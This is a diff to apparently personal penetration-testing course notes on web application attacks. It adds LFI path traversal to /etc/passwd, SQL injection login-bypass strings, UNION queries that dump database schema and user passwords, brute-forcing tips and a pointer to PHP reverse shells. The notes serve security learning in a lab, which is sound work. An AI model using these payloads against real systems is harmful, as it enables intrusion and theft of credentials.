@@ -5,10 +5,14 @@ Creation-Date: 2020-12-19T21:25:26-05:00
 ====== 0x3A Web Applications ======
 Created Saturday 19 December 2020
 
+== Enumeration ==
+#Review response headers with FireFox network tool IOT discover server version info.
+
 == LFI ==
 #Look for things that have ?something=something and replace:
 	ex: [[http://[target%20box]/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd]]
 #Check for other locations in [[../../0x1_Recon/0x1A_POI|places of interest]].
+#Poison a log file
 
 == RFI ==
 #Lets the server access something that you have on your machine.
@@ -21,13 +25,42 @@ Created Saturday 19 December 2020
 #As well as being used in conjunction with burpsuite you can also use it to intercept and execute payloads all by itself. Read the VHL manual or look at the following link for more.
 https://portswigger.net/burp/documentation/desktop/penetration-testing
 
+#Potential options include brute forcing admin consoles by sending sessions to intruder, creating a grep-extract payload of previous executions to find session cookies, setting attack type to pitchfork, and creating a password list.
+
+
 == RCE ==
 
-== SQL Injection ==
-#Notes from class and VHL will cover specific ways to deal with it. 
-	0' or 0=0 UNION SELECT table_schema, table_name from information_schema.tables 
-	
-	Product?= 1 [AND / OR] ---> UNION SELECT table_schema,table_name,column_name from information_schema.columns where table_schema = database()
+== SQL Injection (Form Entry) ==
+#Notes from class and VHL will cover specific ways to deal with it. 	
+#Authentication bypass
+//tom' or 1=1;#//
+
+#If you receive an error try changing the limit
+//tom' or 1=1 LIMIT 1;#//
+
+#You may be able to dump table values as well
+//tom' or 1=1 UNION SELECT table_schema, table_name from information_schema.tables ;#//
+
+== SQL Injection (URL) ==
+{{{code: lang="sql" linenumbers="True"
+'Enumeration (Predefined value refers to the "?[value]=" seen in URLs when there are columns displayed)'
+'Check to see if the URL handles SQL by putting a "apostrophe" after the ?='
+'If its SQL check to see the amount of columns by launching Burp Suite, turn off Intercept and launch the URL against our Windows target. In the Proxy > HTTP history we should see the request we want to repeat. Send it to repeater and adjust the order by 1 value incrementally and search for error in the response window. Send each increased value request until you get a match for error in the response window. The value 1 before you received the error is the amount of columns you have.'
+'Confirm the label of each column by appending the following after the predefined value:'
+union all select 1, 2, 3  #Or as many columns as seen in the previous step.
+'Enumerate even more by adding the following after the predefined value (NOTE: For these to work the field have to replace one of the columns you identified. For example, doing 1,2,3,@@version when you previously identified only 3 colums would result in nothing of relevance displaying on the screen:'
+#Dump everything
+UNION SELECT table_schema,table_name,column_name from information_schema.columns where table_schema = database()
+#Dump version
+union all select 1, 2, @@version
+#Dump user
+union all select 1, 2, user()
+#Tables and Columns
+union all select 1, 2, table_name from information_schema.tables
+union all select 1, 2, column_name from information_schema.columns where table_name='users'
+union all select 1, username, password from users
+}}}
+
 
 == Web Shells ==
 #On sites that you have access to themes, or plugins, you can add lines of code to run that create a reverse shell. Look through useful code snippets specifically [[../../../Useful_code_snippets/PHP_Rev_Shell_Script.txt|PHP Rev Shell]] to see some examples of things you can add. It usually requires a netcat listener on your device and to adjust the IP of each shell. Run through the steps of stabilizing a shell from the [[../|gain a foot hold]] section if necessary.
